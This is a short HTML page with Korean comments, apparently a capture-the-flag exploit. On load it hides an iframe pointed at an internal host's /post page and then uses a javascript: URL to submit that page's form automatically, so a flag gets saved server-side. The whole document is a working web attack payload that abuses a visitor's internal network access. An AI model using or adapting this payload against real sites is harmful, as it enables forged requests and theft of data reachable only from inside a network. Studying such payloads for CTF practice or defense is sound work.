<!DOCTYPE html>
<html>
<head>
<script>
window.onload = function() {
    // 1) /post 로드 (내부 IP이므로 플래그가 input에 들어감)
    var f = document.createElement("iframe");
    f.style.display = "none";
    f.src = "http://home:8001/post";
    document.body.appendChild(f);

    f.onload = function() {
        // 2) 폼 자동 제출 → 서버 info_value에 플래그 저장
        f.src = "javascript:document.forms[0].submit()";
    };
};
</script>
</head>
<body></body>
</html>
